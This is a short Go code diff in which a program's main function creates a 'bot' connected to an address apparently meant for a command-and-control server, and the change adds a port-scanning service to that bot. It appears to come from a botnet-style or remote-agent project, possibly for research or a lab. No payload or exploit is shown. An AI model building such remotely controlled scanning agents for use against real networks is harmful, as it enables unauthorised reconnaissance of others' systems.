@@ -15,7 +15,7 @@ var (
 func main() {
 	flag.Parse()
 
-	bot, err := tcp.NewBot(*ccAddrPtr)
+	bot, err := tcp.NewBot(*ccAddrPtr, &tcp.PortScanService{})
 	if err != nil {
 		log.Panic(err)
 	}
